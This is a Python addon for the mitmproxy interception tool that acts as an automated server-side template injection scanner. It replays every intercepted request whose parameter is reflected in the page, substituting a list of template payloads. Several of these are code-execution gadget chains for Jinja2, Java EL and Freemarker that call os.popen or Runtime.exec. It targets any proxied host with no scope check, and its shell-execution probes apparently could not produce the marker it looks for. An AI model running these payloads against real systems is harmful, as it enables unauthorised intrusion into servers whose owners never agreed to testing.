from mitmproxy import http, ctx
from mitmproxy.io import FlowWriter
import copy
import os
import urllib.parse
import json
import re
import time

class SSTI:
    def __init__(self):
        self.flow_dir = "SSTI_flows"
        os.makedirs(self.flow_dir, exist_ok=True)
        self.alteration_indicators = ["{{95459879*95459879}}", "${95459879*95459879}", "<%= 95459879*95459879 %>", "#{95459879*95459879}", "*{95459879*95459879}", "{{'95459879'|multiply('95459879')}}", "{math equation=\"95459879*95459879\"}", "{{config.items()}}", "#set($x = 95459879*95459879)", "<#assign x=95459879*95459879>${x}", "${95459879*95459879}", "${95459879*95459879}", "{{95459879*'95459879'}}", "{{95459879*'95459879'}}", "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('95459879*95459879').read()}}", "{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['sys'].modules['os'].popen('95459879*95459879').read()}}", "{{config.__class__.__init__.__globals__['os'].popen('95459879*95459879').read()}}", "{{''.__class__.mro()[2].__subclasses__()[40]('95459879*95459879').read()}}", "{{''.__class__.mro()[1].__subclasses__()[396]('95459879*95459879',shell=True,stdout=-1).communicate()}}", "<%= debug('95459879*95459879') %>", "#{T(java.lang.Runtime).getRuntime().exec('95459879*95459879')}", "#if($x == '95459879*95459879')true#{end}", "<#list .data_model?keys as key>${'95459879*95459879'}</#list>", "<#assign command=\"freemarker.template.utility.Execute\"?new()>${command('95459879*95459879')}", "${\"freemarker.template.utility.Execute\"?new()('95459879*95459879')}", "{{95459879*'95459879'}}", "{{ '95459879'*95459879 }}", "{{request.application.__globals__.__builtins__.__import__('os').popen('95459879*95459879').read()}}", "{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('95459879*95459879')['read']()}}", "{{''.__class__.__mro__[2].__subclasses__()[40]('95459879*95459879').read()}}", "${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null, '95459879*95459879')}"]
        self.altered_header = "x-altered"

    def response(self, flow: http.HTTPFlow) -> None:
        content_type = flow.response.headers.get("Content-Type", "")
        
        if self.altered_header in flow.request.headers:
            self.check_altered_reflection(flow)
            return

        if flow.request.method == "GET":
            self.process_parameters(flow, flow.request.query)
        elif flow.request.method == "POST":
            self.process_post_request(flow)

    def process_post_request(self, flow):
        content_type = flow.request.headers.get("Content-Type", "")
        if "application/x-www-form-urlencoded" in content_type:
            params = urllib.parse.parse_qs(flow.request.get_text())
            self.process_parameters(flow, params)
        elif "application/json" in content_type:
            try:
                params = json.loads(flow.request.get_text())
                if isinstance(params, dict):
                    self.process_parameters(flow, params)
            except json.JSONDecodeError:
                ctx.log.info("JSON decode error")

    def process_parameters(self, flow, params):
        for param, value in params.items():
            if isinstance(value, list):  # Handle lists for form data
                value = value[0]
            if isinstance(value, str) and value in flow.response.text:
                self.alter_and_replay(flow, param, value)

    def alter_and_replay(self, original_flow, param, original_value):
        for indicator in self.alteration_indicators:
            altered_value = indicator
            altered_flow = self.alter_request(original_flow, param, altered_value)
            if altered_flow:
                ctx.master.commands.call("replay.client", [altered_flow])

    def alter_request(self, original_flow, param, altered_value):
        new_request = copy.deepcopy(original_flow.request)
        if original_flow.request.method == "GET":
            new_request.query[param] = altered_value
        else:
            content_type = new_request.headers.get("Content-Type", "")
            if "application/x-www-form-urlencoded" in content_type:
                params = urllib.parse.parse_qs(new_request.get_text())
                params[param] = [altered_value]
                new_request.text = urllib.parse.urlencode(params, doseq=True)
            elif "application/json" in content_type:
                try:
                    body = json.loads(new_request.get_text())
                    if param in body and isinstance(body[param], str):
                        body[param] = altered_value
                        new_request.text = json.dumps(body)
                except json.JSONDecodeError:
                    pass
        new_request.headers[self.altered_header] = "true"
        altered_flow = http.HTTPFlow(original_flow.client_conn, original_flow.server_conn)
        altered_flow.request = new_request
        return altered_flow

    def check_altered_reflection(self, flow):
        pattern = re.compile(r'9112588498694640', re.IGNORECASE)  # Define the pattern to match specific keywords
        if pattern.search(flow.response.text):
            ctx.log.info(f"Altered parameter reflected in the response: {flow.request.url}")
            self.save_flow(flow)

    def save_flow(self, flow):
        filename = os.path.join(self.flow_dir, f"{flow.request.method}_captured_request_{int(time.time())}.mitm")
        try:
            with open(filename, "wb") as file:
                fw = FlowWriter(file)
                fw.add(flow)
            ctx.log.info(f"Saved altered flow to {filename}")
        except OSError as e:
            ctx.log.error(f"Error saving .mitm file: {e}")

addons = [SSTI()]
